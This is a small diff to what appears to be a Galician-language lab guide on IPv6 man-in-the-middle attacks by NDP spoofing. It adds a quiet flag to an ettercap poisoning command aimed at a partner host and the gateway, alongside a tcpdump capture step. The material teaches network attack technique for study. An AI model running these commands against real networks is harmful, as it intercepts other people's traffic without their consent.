@@ -339,7 +339,7 @@ Para facer un MITM en IPV6 vamos a facelo a través de ndp (Neighbor Discovery P
 
 * **ATACANTE:**
 
-   1º)Executamos ettercap -> `ettercap -i ens33 -T -M ndp:remote //IPv6_compa/ /10.11.48.1//`.
+   1º)Executamos ettercap -> `ettercap -i ens33 -T -q -M ndp:remote //IPv6_compa/ /10.11.48.1//`.
 
    2º)En paralelo capturamos a paqueteria -> `tcpdump -i ens33 -s 65535 -w mitmipv6.pcap`
 
